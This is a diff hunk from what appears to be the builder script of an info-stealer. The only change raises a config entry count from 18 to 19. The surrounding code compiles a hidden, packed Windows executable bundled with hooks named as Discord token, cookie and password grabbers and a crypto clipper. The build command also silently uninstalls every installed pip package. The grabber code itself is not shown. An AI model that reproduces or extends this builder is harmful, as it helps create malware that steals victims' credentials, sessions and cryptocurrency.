@@ -16,7 +16,7 @@ def compile(debug_mode):
     if 'configuration.ini' in os.listdir('.'): config.read('configuration.ini')
     else: input('Configuration file not found! Press ENTER to terminate...'); sys.exit(0)
 
-    if len(config['SETTINGS']) != 12 or len(config['FUNCTIONALITY']) != 18:
+    if len(config['SETTINGS']) != 12 or len(config['FUNCTIONALITY']) != 19:
         return 'Config corrupted'
 
     compiling_command = 'start cmd /k "title Reorganising packages... & pip freeze > to_uninstall.txt & pip uninstall -y -r to_uninstall.txt > nul & del to_uninstall.txt > nul & pip install pillow > nul & pip install pyinstaller > nul & pip install -r custom_imports.txt > nul & title Compiling source code... & pyinstaller -F --noconsole --upx-dir "resources/" --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py ' + ('--runtime-hook=resources/protections.py ' if debug_mode else '') + '--runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py --add-data="resources/crypto_clipper.json;." --icon "' + config['SETTINGS']['icon_path'] + '" "source_prepared.py" > nul & echo - & echo.Done & echo.- & start dist & del source_prepared.spec > nul & rmdir build /S /Q & pause & exit"'
